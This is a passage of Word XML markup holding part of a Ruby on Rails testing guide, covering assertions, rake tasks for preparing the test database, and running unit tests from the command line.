        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2088"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1F7C0DF8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50437889" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_the_truth</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4773F723" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46DCCB9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7530A4F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">only the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> macro allows a more readable test name. You can still use regular method definitions though.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663517E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method name is generated by replacing spaces with underscores. The result does not need to be a valid Ruby identifier though, the name may contain punctuation characters etc. That’s because in Ruby technically any string may be a method name. Odd ones need </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>define_method</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>send</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> calls, but formally there’s no restriction.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="015A2321" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DE1FAAB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1858427717"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assert true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A025485" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This line of code is called an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>assertion</w:t>
      </w:r>
      <w:r>
        <w:t>. An assertion is a line of code that evaluates an object (or expression) for expected results. For example, an assertion can check:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4671609D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="313"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>does this value = that value?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06943471" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="313"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>is this object nil?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAC7883" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="313"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>does this line of code throw an exception?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399832E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="313"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>is the user’s password greater than 5 characters?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE57E65" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Every test contains one or more assertions. Only when all the assertions are successful will the test pass.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652E9E30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Preparing your Application for Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48778BCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Before you can run your tests, you need to ensure that the test database structure is current. For this you can use the following rake commands:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="77352B49" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D3B14AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rake db:migrate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E9555EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="520DD1C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rake db:test:load</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4DCA7C9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> above runs any pending migrations on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>development</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> environment and updates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>db/schema.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake db:test:load</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> recreates the test database from the current </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>db/schema.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. On subsequent attempts, it is a good idea to first run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>db:test:prepare</w:t>
      </w:r>
      <w:r>
        <w:t>, as it first checks for pending migrations and warns you appropriately.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1B7EDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>db:test:prepare</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will fail with an error if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>db/schema.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> doesn’t exist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DE8001" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.1.1 Rake Tasks for Preparing your Application for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4"/>
        <w:gridCol w:w="5132"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0ADFEDDD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73E1AEA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Tasks </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33F64C75" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="783506B5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4BB4E418" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake db:test:clone</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="759F3805" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Recreate the test database from the current environment’s database schema</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="38401CBB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="254F475D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake db:test:clone_structure</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D718D21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Recreate the test database from the development structure</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="5693B834" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E9B0196" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake db:test:load</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B988E30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Recreate the test database from the current </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>schema.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="7E1221EC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C0E8AF6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake db:test:prepare</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54F60B08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Check for pending migrations and load the test schema</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="58642A17" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18AC49C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake db:test:purge</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="249738A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Empty the test database.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="15AF97A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can see all these rake tasks and their descriptions by running </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake --tasks --describe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C59158B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Running Tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509C3A5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Running a test is as simple as invoking the file containing the test cases through Ruby:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="30567C8E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14778C21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ ruby -Itest test/unit/post_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49478403" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57A03F81" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Loaded suite unit/post_test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39B11E97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Started</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AEF61D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C887C66" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Finished in 0.023513 seconds.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B1916FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C93E21E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 tests, 1 assertions, 0 failures, 0 errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="00F51D65" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will run all the test methods from the test case. Note that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_helper.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory, hence this directory needs to be added to the load path using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>-I</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> switch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56755BF2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also run a particular test method from the test case by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>-n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> switch with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test method name</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7192F57D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
